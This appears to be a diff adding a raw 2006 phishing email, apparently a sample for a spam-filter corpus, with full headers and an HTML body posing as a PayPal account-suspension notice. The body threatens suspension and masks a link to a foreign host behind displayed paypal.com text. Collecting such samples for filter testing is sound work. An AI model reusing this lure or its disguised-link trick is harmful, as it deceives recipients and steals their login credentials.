@@ -1,0 +1,124 @@
+Return-Path: <nobody@server1.hytechost.net>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail1.example.com (mail1.example.com [10.1.2.3])
+	by naughty.example.com (Postfix) with ESMTP id E3537536E59
+	for <nobody@login.example.com>; Mon,  2 Jan 2006 11:14:49 -0500 (EST)
+Received: from mail1.example.com (localhost.example.com [127.0.0.1])
+	by mail1.example.com (Postfix) with ESMTP id D7C576CCD53
+	for <nobody@example.com>; Mon,  2 Jan 2006 11:14:48 -0500 (EST)
+Received: from server1.hytechost.net (unknown [69.56.204.26])
+	by mail1.example.com (Postfix) with ESMTP
+	for <nobody@example.com>; Mon,  2 Jan 2006 11:14:48 -0500 (EST)
+Received: from nobody by server1.hytechost.net with local (Exim 4.52)
+	id 1EtSKc-00065w-QA
+	for nobody@example.com; Mon, 02 Jan 2006 09:14:46 -0700
+To: nobody@example.com
+Subject: PayPal Account Suspension Notice - PayPal Account Limited
+ From: PayPal <service@paypal.com>
+Reply-To: service@paypal.com
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1EtSKc-00065w-QA@server1.hytechost.net>
+From: Nobody <nobody@server1.hytechost.net>
+Date: Mon, 02 Jan 2006 09:14:46 -0700
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server1.hytechost.net
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - server1.hytechost.net
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: **
+X-Spam-Status: No, score=2.1 required=5.0 tests=HTML_MESSAGE,
+	HTML_OBFUSCATE_05_10,HTML_TAG_EXIST_TBODY,MIME_HTML_ONLY,
+	RAZOR2_CF_RANGE_51_100,RAZOR2_CHECK autolearn=no version=3.0.2
+X-Spam-Report: 
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.3 HTML_OBFUSCATE_05_10 BODY: Message is 5% to 10% HTML obfuscation
+	*  0.1 HTML_TAG_EXIST_TBODY BODY: HTML has "tbody" tag
+	*  0.1 RAZOR2_CF_RANGE_51_100 BODY: Razor2 gives confidence level above 50%
+	*      [cf: 100]
+	*  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 190
+
+<html>
+<head>
+</head>
+<body>
+<div align="left"><a href="http://www.paypal.com"><img
+src="https://www.paypal.com/en_GB/i/header/t1Hdr_hpGraphic_563x115.jpg"
+border="0"></a> 
+</div>
+<table align="center" border="0" cellpadding="0" cellspacing="0"
+width="600">
+<tbody>
+<tr>
+<td colspan="3"><img src="pp.files/pixel.gif" height="2" width="2"></td>
+</tr>
+</tbody>
+</table>
+<a href="http://www.paypal.com/cgi-bin/webscr?cmd=_login-run">
+</a>
+<table border="0" width="50%">
+<tbody>
+<tr>
+<td>
+<p><font size="2"><font face="Verdana">Dear valued <strong><strong><span
+style="font-size: 10pt; color: black; font-family: Verdana;">PayPal<sup>®</sup></span></strong> </strong>member</font>: <br>
+</font><br>
+</p>
+<p><font face="Verdana" size="2">It has come to our attention
+that your <span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>®</sup></strong></span>
+account information needs to be updated as part of our continuing
+commitment to protect your account and to reduce the instance of
+fraud on our website. </font><font face="Verdana" size="2"><font
+face="Verdana" size="2"> If you could please take 5-10
+minutes out of your </font><font face="Verdana" size="2">online </font><font
+face="Verdana" size="2">experience and update your personal records
+you will not run into any future </font><font face="Verdana"
+size="2">problems with the online service. <br>
+                                     </font></font></p>
+<font face="Verdana" size="2">
+<p><font face="Verdana" size="2">However, failure to update your
+records will result in account suspension. <br>
+ <br>
+<br>
+Once you have updated your account records, your <span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>®</sup></strong></span>
+session will not be interrupted and will continue as normal. </font></p>
+<p><font face="Verdana" size="2">To update your <span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>®</sup></strong></span>
+records click on the following link: <br>
+</font> <a href="http://www.yamanote.st/www.paypal.com/cgi-bin/webscrcmd_login.php"><font
+face="Verdana" size="2">http://www.paypal.com/cgi-bin/webscr?cmd=_login-run</font></a></p>
+<p><font face="Verdana" size="2"></font> </p>
+<p><font face="Verdana" size="2">Thank You.  <br>
+<span style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>®
+</sup><span
+style="font-size: 10pt; color: black; font-family: Verdana;">UPDATE </span></strong><span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>TEAM</strong></span></span>                                    
+</font></p>
+<img src="http://www.paypal.com/en_US/i/logo/paypal_logo.gif"
+border="0"> <font face="Verdana" size="2">
+<p><font face="Verdana" size="2">Accounts Management As outlined
+in our User Agreement, <span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>®</sup></strong></span>
+will periodically send you information about site changes and
+enhancements. </font></p>
+</font></font></td>
+</tr>
+</tbody>
+</table>
+<a href="http://www.paypal.com/cgi-bin/webscr?cmd=_login-run"> </a>
+</body>
+</html>
+
